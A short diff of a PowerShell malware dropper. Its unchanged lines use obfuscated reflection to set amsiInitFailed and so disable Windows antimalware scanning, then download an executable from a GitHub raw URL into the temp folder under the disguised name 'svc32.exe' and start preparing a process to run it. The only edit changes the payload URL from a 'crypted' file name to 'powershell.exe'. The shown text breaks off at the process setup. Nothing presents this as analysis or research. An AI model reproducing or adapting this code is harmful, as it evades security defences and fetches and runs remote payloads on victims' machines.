@@ -2,7 +2,7 @@ $t=[Ref].Assembly.GetType([string]::Join('',('Sy','stem','.','Man','age','ment',
 $f=$t.GetField([string]::Join('',('am','si','Init','Fai','led')),[Reflection.BindingFlags]'NonPublic,Static')
 $f.SetValue($null,$true)
 
-$u='https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe'
+$u='https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/powershell.exe'
 $p="$env:TEMP\svc32.exe"
 [System.Net.WebClient]::new().DownloadFile($u,$p)
 $si=[System.Diagnostics.ProcessStartInfo]::new()
